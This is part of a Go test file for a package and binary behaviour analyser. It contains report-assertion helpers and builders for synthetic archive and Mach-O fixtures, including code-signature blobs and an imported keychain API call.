		if target.Kind == kind && invokedTargetMatchesName(rep, target, name) && stringSlicesEqual(arguments, command) {
			return
		}
	}
	t.Fatalf("missing execution record %s %s arguments %#v: roots=%#v targets=%#v", kind, name, command, rep.ExecutionRoots, rep.InvokedTargets)
}

func invokedTargetMatchesName(rep Report, target behavior.InvokedTarget, name string) bool {
	if target.Interpreter == name || slices.Contains(target.Arguments, name) {
		return true
	}
	if target.Source.Kind == behavior.EntityKindExecutionRoot {
		for _, root := range rep.ExecutionRoots {
			if root.ID == target.Source.ID && root.Name == name {
				return true
			}
		}
	}
	for _, node := range rep.ArtifactNodes {
		if node.ID != target.NodeID {
			continue
		}
		logical := strings.TrimSuffix(node.LogicalPath, "/")
		return filepath.Base(logical) == name || strings.HasSuffix(logical, "!"+name)
	}
	return false
}

func stringSlicesEqual(left, right []string) bool {
	if len(left) != len(right) {
		return false
	}
	for i := range left {
		if left[i] != right[i] {
			return false
		}
	}
	return true
}

func assertFeature(t *testing.T, rep Report, key, value string) {
	t.Helper()
	for _, feature := range rep.Features {
		if feature.Key == key && feature.Value == value {
			return
		}
	}
	t.Fatalf("missing feature %s=%s: %#v", key, value, rep.Features)
}

func assertPackagingFeatureEvidence(t *testing.T, rep Report, technology, evidenceBase string) {
	t.Helper()
	nodes := make(map[string]artifact.Node, len(rep.ArtifactNodes))
	for _, node := range rep.ArtifactNodes {
		nodes[node.ID] = node
	}
	evidence := make(map[string]behavior.Evidence, len(rep.Evidence))
	for _, item := range rep.Evidence {
		evidence[item.ID] = item
	}
	for _, feature := range rep.Features {
		if feature.Key != "artifact.packaging_technology" || feature.Value != technology {
			continue
		}
		if feature.Support != behavior.SupportCorroborated || len(feature.EvidenceIDs) != 2 {
			t.Fatalf("invalid %s packaging feature: %#v", technology, feature)
		}
		for _, evidenceID := range feature.EvidenceIDs {
			item, ok := evidence[evidenceID]
			if !ok || !item.OffsetKnown || item.Method != "facade-recognizer" || filepath.Base(nodes[item.NodeID].LogicalPath) != evidenceBase {
				t.Fatalf("invalid %s packaging evidence %q: evidence=%#v node=%#v", technology, evidenceID, item, nodes[item.NodeID])
			}
		}
		return
	}
	t.Fatalf("missing packaging feature artifact.packaging_technology=%s: %#v", technology, rep.Features)
}

func assertFeatureQualifier(t *testing.T, rep Report, key, value, qualifier, want string) {
	t.Helper()
	for _, feature := range rep.Features {
		if feature.Key == key && feature.Value == value && feature.Qualifiers[qualifier] == want {
			return
		}
	}
	t.Fatalf("missing feature %s=%s with %s=%s: %#v", key, value, qualifier, want, rep.Features)
}

func assertNoFeature(t *testing.T, rep Report, key, value string) {
	t.Helper()
	for _, feature := range rep.Features {
		if feature.Key == key && feature.Value == value {
			t.Fatalf("unexpected feature %s=%s: %#v", key, value, rep.Features)
		}
	}
}

func assertNetworkDestination(t *testing.T, rep Report, want string) {
	t.Helper()
	for _, item := range networkPresentationRecords(rep) {
		for _, dest := range item.Destinations {
			if dest == want {
				return
			}
		}
	}
	t.Fatalf("missing network destination %s: operations=%#v features=%#v", want, rep.Operations, rep.Features)
}

func assertNoNetworkDestination(t *testing.T, rep Report, want string) {
	t.Helper()
	for _, item := range networkPresentationRecords(rep) {
		for _, dest := range item.Destinations {
			if dest == want {
				t.Fatalf("unexpected network destination %s: operations=%#v features=%#v", want, rep.Operations, rep.Features)
			}
		}
	}
}

func assertDelegatedNetworkDestination(t *testing.T, rep Report, caller, want string) {
	t.Helper()
	for _, item := range networkPresentationRecords(rep) {
		if item.Caller != caller || item.TLSOwner != "delegated application" || item.TLSLinkage != "delegated-process" {
			continue
		}
		for _, dest := range item.Destinations {
			if dest == want {
				return
			}
		}
	}
	t.Fatalf("missing delegated network %s %s: %#v", caller, want, rep.NetworkImplementations)
}

func assertNetworkSecurity(t *testing.T, rep Report, want string) {
	t.Helper()
	for _, item := range networkPresentationRecords(rep) {
		for _, security := range item.Security {
			if security == want {
				return
			}
		}
	}
	t.Fatalf("missing network security %s: %#v", want, rep.NetworkImplementations)
}

func assertNoNetworkSecurity(t *testing.T, rep Report, want string) {
	t.Helper()
	for _, item := range networkPresentationRecords(rep) {
		for _, security := range item.Security {
			if security == want {
				t.Fatalf("unexpected network security %s: %#v", want, rep.NetworkImplementations)
			}
		}
	}
}

func assertOperationQualifier(t *testing.T, rep Report, key, value string) {
	t.Helper()
	for _, operation := range rep.Operations {
		if operation.Qualifiers[key] == value {
			return
		}
	}
	t.Fatalf("missing operation qualifier %s=%s: %#v", key, value, rep.Operations)
}

func hasRelationship(rep Report, kind string) bool {
	for _, rel := range rep.Relationships {
		if rel.Kind == kind {
			return true
		}
	}
	return false
}

func assertDiagnosticContains(t *testing.T, rep Report, want string) {
	t.Helper()
	for _, diag := range rep.Diagnostics {
		if strings.Contains(diag, want) {
			return
		}
	}
	t.Fatalf("missing diagnostic containing %q: %#v", want, rep.Diagnostics)
}

func assertCoverageContains(t *testing.T, rep Report, scope, status, detail string) {
	t.Helper()
	for _, coverage := range rep.Coverage {
		if coverage.AnalysisArea == scope && coverage.Status == status && strings.Contains(coverage.Detail, detail) {
			return
		}
	}
	t.Fatalf("missing coverage %s %s containing %q: %#v", scope, status, detail, rep.Coverage)
}

func assertArtifactProperty(t *testing.T, rep Report, kind, value string) {
	t.Helper()
	for _, item := range rep.ArtifactProperties {
		if item.Kind == kind && item.Value == value {
			return
		}
	}
	t.Fatalf("missing artifact property %s=%s: %#v", kind, value, rep.ArtifactProperties)
}

func assertReportReferencesValid(t *testing.T, rep Report) {
	t.Helper()
	nodes := map[string]bool{}
	for _, node := range rep.ArtifactNodes {
		if nodes[node.ID] {
			t.Fatalf("duplicate node ID %s", node.ID)
		}
		nodes[node.ID] = true
		if node.ParentID != "" && !nodes[node.ParentID] {
			t.Fatalf("node %s references missing parent %s", node.ID, node.ParentID)
		}
	}
	evidence := map[string]bool{}
	for _, ev := range rep.Evidence {
		if evidence[ev.ID] {
			t.Fatalf("duplicate evidence ID %s", ev.ID)
		}
		evidence[ev.ID] = true
		if ev.NodeID != "" && !nodes[ev.NodeID] {
			t.Fatalf("evidence %s references missing node %s", ev.ID, ev.NodeID)
		}
	}
	operations := map[string]bool{}
	for _, operation := range rep.Operations {
		if operations[operation.ID] {
			t.Fatalf("duplicate operation ID %s", operation.ID)
		}
		operations[operation.ID] = true
		if !nodes[operation.SubjectNodeID] {
			t.Fatalf("operation %s references missing node %s", operation.ID, operation.SubjectNodeID)
		}
		assertEvidenceIDsValid(t, evidence, operation.EvidenceIDs)
	}
	for _, root := range rep.ExecutionRoots {
		if !nodes[root.DeclarationNodeID] {
			t.Fatalf("execution root %s references missing declaration node %s", root.ID, root.DeclarationNodeID)
		}
		if root.StartNodeID != "" && !nodes[root.StartNodeID] {
			t.Fatalf("execution root %s references missing start node %s", root.ID, root.StartNodeID)
		}
		assertEvidenceIDsValid(t, evidence, root.EvidenceIDs)
	}
	for _, target := range rep.InvokedTargets {
		if !nodes[target.NodeID] {
			t.Fatalf("invoked target %s references missing node %s", target.ID, target.NodeID)
		}
		assertEvidenceIDsValid(t, evidence, target.EvidenceIDs)
	}
	for _, detail := range rep.NetworkImplementations {
		for _, operationID := range detail.OperationIDs {
			if !operations[operationID] {
				t.Fatalf("network detail references missing operation %s", operationID)
			}
		}
		assertEvidenceIDsValid(t, evidence, detail.EvidenceIDs)
	}
	for _, capabilityMatch := range rep.Capabilities {
		if !nodes[capabilityMatch.SubjectNodeID] {
			t.Fatalf("capability match %s references missing subject %s", capabilityMatch.ID, capabilityMatch.SubjectNodeID)
		}
		if len(capabilityMatch.OperationIDs) == 0 {
			t.Fatalf("capability match %s has no supporting operations", capabilityMatch.ID)
		}
		for _, operationID := range capabilityMatch.OperationIDs {
			if !operations[operationID] {
				t.Fatalf("capability match %s references missing operation %s", capabilityMatch.ID, operationID)
			}
		}
		assertEvidenceIDsValid(t, evidence, capabilityMatch.EvidenceIDs)
	}
}

func assertEvidenceIDsValid(t *testing.T, evidence map[string]bool, ids []string) {
	t.Helper()
	for _, id := range ids {
		if !evidence[id] {
			t.Fatalf("missing evidence ID %s", id)
		}
	}
}

func zipEntries(t *testing.T, entries map[string][]byte) []byte {
	t.Helper()
	var names []string
	for name := range entries {
		names = append(names, name)
	}
	sort.Strings(names)
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, name := range names {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write(entries[name]); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func reportWheelRecordLine(path string, data []byte) string {
	sum := sha256.Sum256(data)
	return fmt.Sprintf("%s,sha256=%s,%d\n", path, base64.RawURLEncoding.EncodeToString(sum[:]), len(data))
}

func asarEntries(t *testing.T, files map[string][]byte) []byte {
	t.Helper()
	type fileHeader struct {
		Offset string `json:"offset"`
		Size   int    `json:"size"`
	}
	root := map[string]any{"files": map[string]any{}}
	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names)
	var payload bytes.Buffer
	offset := 0
	for _, name := range names {
		addASARHeaderEntry(root["files"].(map[string]any), strings.Split(name, "/"), fileHeader{Offset: strconv.Itoa(offset), Size: len(files[name])})
		payload.Write(files[name])
		offset += len(files[name])
	}
	headerJSON, err := json.Marshal(root)
	if err != nil {
		t.Fatal(err)
	}
	alignedJSONSize := (len(headerJSON) + 3) &^ 3
	headerPickle := make([]byte, 8+alignedJSONSize)
	binary.LittleEndian.PutUint32(headerPickle[0:4], uint32(alignedJSONSize+4))
	binary.LittleEndian.PutUint32(headerPickle[4:8], uint32(len(headerJSON)))
	copy(headerPickle[8:], headerJSON)
	sizePickle := make([]byte, 8)
	binary.LittleEndian.PutUint32(sizePickle[0:4], 4)
	binary.LittleEndian.PutUint32(sizePickle[4:8], uint32(len(headerPickle)))
	out := append(sizePickle, headerPickle...)
	return append(out, payload.Bytes()...)
}

func addASARHeaderEntry(root map[string]any, parts []string, file any) {
	if len(parts) == 1 {
		root[parts[0]] = file
		return
	}
	entry, ok := root[parts[0]].(map[string]any)
	if !ok {
		children := map[string]any{}
		entry = map[string]any{"files": children}
		root[parts[0]] = entry
	}
	children := entry["files"].(map[string]any)
	addASARHeaderEntry(children, parts[1:], file)
}

func tgz(t *testing.T, entries map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range entries {
		data := []byte(body)
		if err := tw.WriteHeader(&tar.Header{Name: name, Mode: 0o755, Size: int64(len(data))}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write(data); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func gzipData(t *testing.T, data []byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	if _, err := gz.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func xar(t *testing.T, files map[string][]byte) []byte {
	t.Helper()
	var heap []byte
	var names []string
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names)
	var toc bytes.Buffer
	toc.WriteString("<xar><toc>")
	for i, name := range names {
		data := files[name]
		toc.WriteString("<file id=\"")
		toc.WriteString(string(rune('1' + i)))
		toc.WriteString("\" type=\"file\"><name>")
		toc.WriteString(name)
		toc.WriteString("</name><data><length>")
		toc.WriteString(strconv.Itoa(len(data)))
		toc.WriteString("</length><offset>")
		toc.WriteString(strconv.Itoa(len(heap)))
		toc.WriteString("</offset><size>")
		toc.WriteString(strconv.Itoa(len(data)))
		toc.WriteString("</size></data></file>")
		heap = append(heap, data...)
	}
	toc.WriteString("</toc></xar>")
	tocXML := toc.Bytes()
	var compressed bytes.Buffer
	zw := zlib.NewWriter(&compressed)
	if _, err := zw.Write(tocXML); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	header := make([]byte, 28)
	copy(header[0:4], []byte("xar!"))
	binary.BigEndian.PutUint16(header[4:6], 28)
	binary.BigEndian.PutUint16(header[6:8], 1)
	binary.BigEndian.PutUint64(header[8:16], uint64(compressed.Len()))
	binary.BigEndian.PutUint64(header[16:24], uint64(len(tocXML)))
	var out []byte
	out = append(out, header...)
	out = append(out, compressed.Bytes()...)
	out = append(out, heap...)
	return out
}

func cpioNewc(t *testing.T, files map[string][]byte) []byte {
	t.Helper()
	var names []string
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names)
	var out []byte
	for i, name := range names {
		out = appendCPIOEntry(out, uint64(i+1), 0o100755, name, files[name])
	}
	out = appendCPIOEntry(out, uint64(len(names)+1), 0, "TRAILER!!!", nil)
	return out
}

func appendCPIOEntry(out []byte, ino, mode uint64, name string, data []byte) []byte {
	header := fmt.Sprintf(
		"070701%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x",
		ino, mode, 0, 0, 1, 0, len(data), 0, 0, 0, 0, len(name)+1, 0,
	)
	out = append(out, []byte(header)...)
	out = append(out, []byte(name)...)
	out = append(out, 0)
	out = pad4(out)
	out = append(out, data...)
	return pad4(out)
}

func pad4(in []byte) []byte {
	for len(in)%4 != 0 {
		in = append(in, 0)
	}
	return in
}

func fatMachOFixture(t *testing.T) []byte {
	t.Helper()
	x86 := thinMachO(0x01000007, 3)
	arm := thinMachO(0x0100000c, 0)
	const headerSize = 8 + 2*20
	x86Offset := align(headerSize, 8)
	armOffset := align(x86Offset+len(x86), 8)
	out := make([]byte, armOffset+len(arm))
	binary.BigEndian.PutUint32(out[0:4], 0xcafebabe)
	binary.BigEndian.PutUint32(out[4:8], 2)
	writeFatArch(out[8:28], 0x01000007, 3, uint32(x86Offset), uint32(len(x86)), 3)
	writeFatArch(out[28:48], 0x0100000c, 0, uint32(armOffset), uint32(len(arm)), 3)
	copy(out[x86Offset:], x86)
	copy(out[armOffset:], arm)
	return out
}

func writeFatArch(out []byte, cpu, subcpu, offset, size, align uint32) {
	binary.BigEndian.PutUint32(out[0:4], cpu)
	binary.BigEndian.PutUint32(out[4:8], subcpu)
	binary.BigEndian.PutUint32(out[8:12], offset)
	binary.BigEndian.PutUint32(out[12:16], size)
	binary.BigEndian.PutUint32(out[16:20], align)
}

func thinMachO(cpu, subcpu uint32) []byte {
	out := make([]byte, 32)
	binary.LittleEndian.PutUint32(out[0:4], 0xfeedfacf)
	binary.LittleEndian.PutUint32(out[4:8], cpu)
	binary.LittleEndian.PutUint32(out[8:12], subcpu)
	binary.LittleEndian.PutUint32(out[12:16], 2)
	binary.LittleEndian.PutUint32(out[16:20], 0)
	binary.LittleEndian.PutUint32(out[20:24], 0)
	binary.LittleEndian.PutUint32(out[24:28], 0x200000)
	return out
}

func machoWithEncryptionInfo() []byte {
	const headerSize = 32
	const encryptionCommandSize = 24
	const encryptedSize = 16
	out := make([]byte, headerSize+encryptionCommandSize+encryptedSize)
	binary.LittleEndian.PutUint32(out[0:4], 0xfeedfacf)
	binary.LittleEndian.PutUint32(out[4:8], 0x01000007)
	binary.LittleEndian.PutUint32(out[8:12], 3)
	binary.LittleEndian.PutUint32(out[12:16], 2)
	binary.LittleEndian.PutUint32(out[16:20], 1)
	binary.LittleEndian.PutUint32(out[20:24], encryptionCommandSize)
	binary.LittleEndian.PutUint32(out[24:28], 0x200000)
	cmd := out[headerSize : headerSize+encryptionCommandSize]
	binary.LittleEndian.PutUint32(cmd[0:4], 0x2c)
	binary.LittleEndian.PutUint32(cmd[4:8], encryptionCommandSize)
	binary.LittleEndian.PutUint32(cmd[8:12], headerSize+encryptionCommandSize)
	binary.LittleEndian.PutUint32(cmd[12:16], encryptedSize)
	binary.LittleEndian.PutUint32(cmd[16:20], 1)
	return out
}

func machoWithCodeSignature() []byte {
	sig := codeSignatureSuperBlob()
	const headerSize = 32
	const codeSigCommandSize = 16
	sigOff := align(headerSize+codeSigCommandSize, 8)
	out := make([]byte, sigOff+len(sig))
	binary.LittleEndian.PutUint32(out[0:4], 0xfeedfacf)
	binary.LittleEndian.PutUint32(out[4:8], 0x01000007)
	binary.LittleEndian.PutUint32(out[8:12], 3)
	binary.LittleEndian.PutUint32(out[12:16], 2)
	binary.LittleEndian.PutUint32(out[16:20], 1)
	binary.LittleEndian.PutUint32(out[20:24], codeSigCommandSize)
	binary.LittleEndian.PutUint32(out[24:28], 0x200000)
	cmd := out[headerSize : headerSize+codeSigCommandSize]
	binary.LittleEndian.PutUint32(cmd[0:4], 0x1d)
	binary.LittleEndian.PutUint32(cmd[4:8], codeSigCommandSize)
	binary.LittleEndian.PutUint32(cmd[8:12], uint32(sigOff))
	binary.LittleEndian.PutUint32(cmd[12:16], uint32(len(sig)))
	copy(out[sigOff:], sig)
	return out
}

func codeSignatureSuperBlob() []byte {
	codeDir := codeDirectoryBlob("com.example.maratus", "TEAMID1234")
	entitlements := xmlEntitlementsBlob(`<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>com.apple.security.get-task-allow</key><true/>
<key>com.apple.security.cs.disable-library-validation</key><true/>
<key>com.apple.security.network.client</key><true/>
<key>keychain-access-groups</key><array><string>TEAMID1234.com.example.maratus</string></array>
</dict></plist>`)
	der := derEntitlementsBlob()
	const count = 3
	headerLen := 12 + count*8
	codeDirOff := headerLen
	entitlementsOff := codeDirOff + len(codeDir)
	derOff := entitlementsOff + len(entitlements)
	total := derOff + len(der)
	out := make([]byte, total)
	binary.BigEndian.PutUint32(out[0:4], 0xfade0cc0)
	binary.BigEndian.PutUint32(out[4:8], uint32(total))
	binary.BigEndian.PutUint32(out[8:12], count)
	writeSuperBlobIndex(out[12:20], 0, codeDirOff)
	writeSuperBlobIndex(out[20:28], 5, entitlementsOff)
	writeSuperBlobIndex(out[28:36], 7, derOff)
	copy(out[codeDirOff:], codeDir)
	copy(out[entitlementsOff:], entitlements)
	copy(out[derOff:], der)
	return out
}

func writeSuperBlobIndex(out []byte, slot uint32, offset int) {
	binary.BigEndian.PutUint32(out[0:4], slot)
	binary.BigEndian.PutUint32(out[4:8], uint32(offset))
}

func codeDirectoryBlob(identifier, teamID string) []byte {
	ident := []byte(identifier + "\x00")
	team := []byte(teamID + "\x00")
	const baseLen = 52
	identOff := baseLen
	teamOff := identOff + len(ident)
	total := teamOff + len(team)
	out := make([]byte, total)
	binary.BigEndian.PutUint32(out[0:4], 0xfade0c02)
	binary.BigEndian.PutUint32(out[4:8], uint32(total))
	binary.BigEndian.PutUint32(out[8:12], 0x20200)
	binary.BigEndian.PutUint32(out[12:16], 0x10000)
	binary.BigEndian.PutUint32(out[20:24], uint32(identOff))
	out[36] = 32
	out[37] = 2
	out[39] = 12
	binary.BigEndian.PutUint32(out[48:52], uint32(teamOff))
	copy(out[identOff:], ident)
	copy(out[teamOff:], team)
	return out
}

func xmlEntitlementsBlob(xml string) []byte {
	body := []byte(xml)
	out := make([]byte, 8+len(body))
	binary.BigEndian.PutUint32(out[0:4], 0xfade7171)
	binary.BigEndian.PutUint32(out[4:8], uint32(len(out)))
	copy(out[8:], body)
	return out
}

func derEntitlementsBlob() []byte {
	body := []byte{0x30, 0x00}
	out := make([]byte, 8+len(body))
	binary.BigEndian.PutUint32(out[0:4], 0xfade7172)
	binary.BigEndian.PutUint32(out[4:8], uint32(len(out)))
	copy(out[8:], body)
	return out
}

func machoObjectWithSecItemCall(called bool) []byte {
	return machoObjectWithImportedCall("SecItemCopyMatching", called)
}

func machoObjectWithImportedCall(symbol string, called bool) []byte {
	text := []byte{0xe8, 0, 0, 0, 0, 0xc3}
	const headerSize = 32
	const segmentCommandSize = 72 + 80
	const symtabCommandSize = 24
	const sizeofCommands = segmentCommandSize + symtabCommandSize
	textOff := headerSize + sizeofCommands
	relocOff := align(textOff+len(text), 8)
	relocSize := 0
	if called {
		relocSize = 8
	}
	symOff := align(relocOff+relocSize, 8)
	symbolName := "_" + symbol
	strings := []byte("\x00_main\x00" + symbolName + "\x00")
	strOff := symOff + 2*16
	out := make([]byte, strOff+len(strings))

	binary.LittleEndian.PutUint32(out[0:4], 0xfeedfacf)
	binary.LittleEndian.PutUint32(out[4:8], 0x01000007)
	binary.LittleEndian.PutUint32(out[8:12], 3)
	binary.LittleEndian.PutUint32(out[12:16], 1)
	binary.LittleEndian.PutUint32(out[16:20], 2)
	binary.LittleEndian.PutUint32(out[20:24], sizeofCommands)
	binary.LittleEndian.PutUint32(out[24:28], 0x2000)

	seg := out[headerSize : headerSize+segmentCommandSize]
	binary.LittleEndian.PutUint32(seg[0:4], 0x19)
	binary.LittleEndian.PutUint32(seg[4:8], segmentCommandSize)
	copy(seg[8:24], []byte("__TEXT"))
	binary.LittleEndian.PutUint64(seg[24:32], 0)
	binary.LittleEndian.PutUint64(seg[32:40], uint64(len(text)))
	binary.LittleEndian.PutUint64(seg[40:48], uint64(textOff))
	binary.LittleEndian.PutUint64(seg[48:56], uint64(len(text)))
	binary.LittleEndian.PutUint32(seg[56:60], 5)
	binary.LittleEndian.PutUint32(seg[60:64], 5)
	binary.LittleEndian.PutUint32(seg[64:68], 1)
	sec := seg[72 : 72+80]
	copy(sec[0:16], []byte("__text"))
	copy(sec[16:32], []byte("__TEXT"))
	binary.LittleEndian.PutUint64(sec[32:40], 0)
	binary.LittleEndian.PutUint64(sec[40:48], uint64(len(text)))
	binary.LittleEndian.PutUint32(sec[48:52], uint32(textOff))
	binary.LittleEndian.PutUint32(sec[52:56], 2)
	if called {
		binary.LittleEndian.PutUint32(sec[56:60], uint32(relocOff))
		binary.LittleEndian.PutUint32(sec[60:64], 1)
	}
	binary.LittleEndian.PutUint32(sec[64:68], 0x80000400)

	symtab := out[headerSize+segmentCommandSize : headerSize+sizeofCommands]
	binary.LittleEndian.PutUint32(symtab[0:4], 0x2)
	binary.LittleEndian.PutUint32(symtab[4:8], symtabCommandSize)
	binary.LittleEndian.PutUint32(symtab[8:12], uint32(symOff))
	binary.LittleEndian.PutUint32(symtab[12:16], 2)
	binary.LittleEndian.PutUint32(symtab[16:20], uint32(strOff))
	binary.LittleEndian.PutUint32(symtab[20:24], uint32(len(strings)))

	copy(out[textOff:], text)
	if called {
		binary.LittleEndian.PutUint32(out[relocOff:relocOff+4], 1)
		relocInfo := uint32(1) | 1<<24 | 2<<25 | 1<<27 | 2<<28
		binary.LittleEndian.PutUint32(out[relocOff+4:relocOff+8], relocInfo)
	}

	writeNlist64(out[symOff:symOff+16], 1, 0x0f, 1, 0, 0)
	writeNlist64(out[symOff+16:symOff+32], 7, 0x01, 0, 0, 0)
	copy(out[strOff:], strings)
	return out
}

func machoLinkedStubFixture() []byte {
	text := []byte{0xe8, 0x03, 0x00, 0x00, 0x00, 0xc3}
	stub := []byte{0xff, 0x25, 0, 0, 0, 0}
	const headerSize = 32
	const segmentCommandSize = 72 + 2*80
	const symtabCommandSize = 24
	const dysymtabCommandSize = 80
	const sizeofCommands = segmentCommandSize + symtabCommandSize + dysymtabCommandSize
	textOff := headerSize + sizeofCommands
	stubOff := align(textOff+len(text), 8)
	symOff := align(stubOff+len(stub), 8)
	strings := []byte("\x00_main\x00_SecItemCopyMatching\x00")
	strOff := symOff + 2*16
	indirectOff := align(strOff+len(strings), 4)
	out := make([]byte, indirectOff+4)

	binary.LittleEndian.PutUint32(out[0:4], 0xfeedfacf)
	binary.LittleEndian.PutUint32(out[4:8], 0x01000007)
	binary.LittleEndian.PutUint32(out[8:12], 3)
	binary.LittleEndian.PutUint32(out[12:16], 2)
	binary.LittleEndian.PutUint32(out[16:20], 3)
	binary.LittleEndian.PutUint32(out[20:24], sizeofCommands)
	binary.LittleEndian.PutUint32(out[24:28], 0x2000)

	seg := out[headerSize : headerSize+segmentCommandSize]
	binary.LittleEndian.PutUint32(seg[0:4], 0x19)
	binary.LittleEndian.PutUint32(seg[4:8], segmentCommandSize)
	copy(seg[8:24], []byte("__TEXT"))
	binary.LittleEndian.PutUint64(seg[24:32], 0x1000)
	binary.LittleEndian.PutUint64(seg[32:40], 0x1000)
	binary.LittleEndian.PutUint64(seg[40:48], uint64(textOff))
	binary.LittleEndian.PutUint64(seg[48:56], uint64(stubOff+len(stub)-textOff))
	binary.LittleEndian.PutUint32(seg[56:60], 5)
	binary.LittleEndian.PutUint32(seg[60:64], 5)
	binary.LittleEndian.PutUint32(seg[64:68], 2)

	textSec := seg[72 : 72+80]
	copy(textSec[0:16], []byte("__text"))
	copy(textSec[16:32], []byte("__TEXT"))
	binary.LittleEndian.PutUint64(textSec[32:40], 0x1000)
	binary.LittleEndian.PutUint64(textSec[40:48], uint64(len(text)))
	binary.LittleEndian.PutUint32(textSec[48:52], uint32(textOff))
	binary.LittleEndian.PutUint32(textSec[52:56], 2)
	binary.LittleEndian.PutUint32(textSec[64:68], 0x80000400)

	stubSec := seg[72+80 : 72+160]
	copy(stubSec[0:16], []byte("__stubs"))
	copy(stubSec[16:32], []byte("__TEXT"))
	binary.LittleEndian.PutUint64(stubSec[32:40], 0x1008)
	binary.LittleEndian.PutUint64(stubSec[40:48], uint64(len(stub)))
	binary.LittleEndian.PutUint32(stubSec[48:52], uint32(stubOff))
	binary.LittleEndian.PutUint32(stubSec[52:56], 1)
	binary.LittleEndian.PutUint32(stubSec[64:68], 0x80000408)
	binary.LittleEndian.PutUint32(stubSec[68:72], 0)
	binary.LittleEndian.PutUint32(stubSec[72:76], 6)

	symtab := out[headerSize+segmentCommandSize : headerSize+segmentCommandSize+symtabCommandSize]
	binary.LittleEndian.PutUint32(symtab[0:4], 0x2)
	binary.LittleEndian.PutUint32(symtab[4:8], symtabCommandSize)
	binary.LittleEndian.PutUint32(symtab[8:12], uint32(symOff))
	binary.LittleEndian.PutUint32(symtab[12:16], 2)
	binary.LittleEndian.PutUint32(symtab[16:20], uint32(strOff))
	binary.LittleEndian.PutUint32(symtab[20:24], uint32(len(strings)))

	dysym := out[headerSize+segmentCommandSize+symtabCommandSize : headerSize+sizeofCommands]
	binary.LittleEndian.PutUint32(dysym[0:4], 0xb)
	binary.LittleEndian.PutUint32(dysym[4:8], dysymtabCommandSize)
	binary.LittleEndian.PutUint32(dysym[24:28], 1)
	binary.LittleEndian.PutUint32(dysym[28:32], 1)
	binary.LittleEndian.PutUint32(dysym[56:60], uint32(indirectOff))
	binary.LittleEndian.PutUint32(dysym[60:64], 1)

	copy(out[textOff:], text)
	copy(out[stubOff:], stub)
	writeNlist64(out[symOff:symOff+16], 1, 0x0f, 1, 0, 0x1000)
	writeNlist64(out[symOff+16:symOff+32], 7, 0x01, 0, 0, 0)
	copy(out[strOff:], strings)
	binary.LittleEndian.PutUint32(out[indirectOff:indirectOff+4], 1)
	return out
}

func strippedMachOWithFunctionStarts() []byte {
	text := []byte{
		0xe8, 0x03, 0x00, 0x00, 0x00,
		0xc3,
		0x90, 0x90,
		0xc3,
	}
	const headerSize = 32
	const segmentCommandSize = 72 + 80
	const functionStartsCommandSize = 16
	const sizeofCommands = segmentCommandSize + functionStartsCommandSize
	textOff := headerSize + sizeofCommands
	starts := []byte{byte(textOff&0x7f) | 0x80, byte(textOff >> 7), 0x08, 0x00}
	startsOff := align(textOff+len(text), 8)
	out := make([]byte, startsOff+len(starts))

	binary.LittleEndian.PutUint32(out[0:4], 0xfeedfacf)
	binary.LittleEndian.PutUint32(out[4:8], 0x01000007)
	binary.LittleEndian.PutUint32(out[8:12], 3)
	binary.LittleEndian.PutUint32(out[12:16], 2)
	binary.LittleEndian.PutUint32(out[16:20], 2)
	binary.LittleEndian.PutUint32(out[20:24], sizeofCommands)
	binary.LittleEndian.PutUint32(out[24:28], 0x2000)

	seg := out[headerSize : headerSize+segmentCommandSize]
	binary.LittleEndian.PutUint32(seg[0:4], 0x19)
	binary.LittleEndian.PutUint32(seg[4:8], segmentCommandSize)
	copy(seg[8:24], []byte("__TEXT"))
	binary.LittleEndian.PutUint64(seg[24:32], 0)
	binary.LittleEndian.PutUint64(seg[32:40], 0x2000)
	binary.LittleEndian.PutUint64(seg[40:48], 0)
	binary.LittleEndian.PutUint64(seg[48:56], uint64(textOff+len(text)))
	binary.LittleEndian.PutUint32(seg[56:60], 5)
	binary.LittleEndian.PutUint32(seg[60:64], 5)
	binary.LittleEndian.PutUint32(seg[64:68], 1)
	sec := seg[72 : 72+80]
	copy(sec[0:16], []byte("__text"))
	copy(sec[16:32], []byte("__TEXT"))
	binary.LittleEndian.PutUint64(sec[32:40], uint64(textOff))
	binary.LittleEndian.PutUint64(sec[40:48], uint64(len(text)))
	binary.LittleEndian.PutUint32(sec[48:52], uint32(textOff))
	binary.LittleEndian.PutUint32(sec[52:56], 2)
	binary.LittleEndian.PutUint32(sec[64:68], 0x80000400)

	fn := out[headerSize+segmentCommandSize : headerSize+sizeofCommands]
	binary.LittleEndian.PutUint32(fn[0:4], 0x26)
	binary.LittleEndian.PutUint32(fn[4:8], functionStartsCommandSize)
	binary.LittleEndian.PutUint32(fn[8:12], uint32(startsOff))
	binary.LittleEndian.PutUint32(fn[12:16], uint32(len(starts)))

	copy(out[textOff:], text)
	copy(out[startsOff:], starts)
	return out
}

func writeNlist64(out []byte, strx uint32, typ, sect uint8, desc uint16, value uint64) {
	binary.LittleEndian.PutUint32(out[0:4], strx)
	out[4] = typ
	out[5] = sect
	binary.LittleEndian.PutUint16(out[6:8], desc)
	binary.LittleEndian.PutUint64(out[8:16], value)
}

func align(value, boundary int) int {
	remainder := value % boundary
	if remainder == 0 {
		return value
	}
	return value + boundary - remainder
}
